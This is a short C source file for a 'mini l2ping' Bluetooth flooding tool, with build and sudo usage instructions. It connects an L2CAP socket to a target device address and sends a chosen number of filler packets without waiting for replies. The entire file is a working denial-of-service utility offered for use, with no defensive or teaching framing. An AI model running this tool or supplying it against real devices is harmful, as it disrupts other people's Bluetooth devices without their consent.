/*
 * mini_l2ping.c - A minimal l2ping flood-style tool
 *
 * Build:
 *   gcc mini_l2ping.c -o mini_l2ping -lbluetooth
 *
 * Usage:
 *   sudo ./mini_l2ping <bdaddr> <packet_size> <count>
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <bluetooth/bluetooth.h>
#include <bluetooth/l2cap.h>

int main(int argc, char *argv[]) {
    if (argc < 4) {
        fprintf(stderr, "Usage: %s <bdaddr> <packet_size> <count>\n", argv[0]);
        return 1;
    }

    char *dest = argv[1];
    int size   = atoi(argv[2]);
    int count  = atoi(argv[3]);

    if (size < 1) {
        fprintf(stderr, "Packet size must be above 1.\n");
        return 1;
    }

    // Fill payload
    char *buf = malloc(size);
    memset(buf, 'A', size);

    // Setup destination
    struct sockaddr_l2 addr = {0};
    addr.l2_family = AF_BLUETOOTH;
    str2ba(dest, &addr.l2_bdaddr);

    // Create L2CAP socket
    int sock = socket(AF_BLUETOOTH, SOCK_SEQPACKET, BTPROTO_L2CAP);
    if (sock < 0) {
        perror("socket");
        return 1;
    }

    // Connect to target
    addr.l2_psm = htobs(0x0001);
    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("connect");
        close(sock);
        return 1;
    }

    printf("[+] Connected to %s, flooding %d echo packets of %d bytes...\n",
           dest, count, size);

    int sent = 0, errors = 0;

    for (int i = 0; i < count; i++) {
        if (send(sock, buf, size, 0) < 0) {
            perror("send");
            errors++;
            continue;
        }
        sent++;

        // Flood mode: don’t wait for replies
        // Just show a dot for progress after every 50 packets sent
        if (i % 50 == 0) {
            printf(".");
            fflush(stdout);
        }
    }

    printf("\n[+] Flood complete: %d packets sent, %d errors\n", sent, errors);

    close(sock);
    free(buf);
    return 0;
}

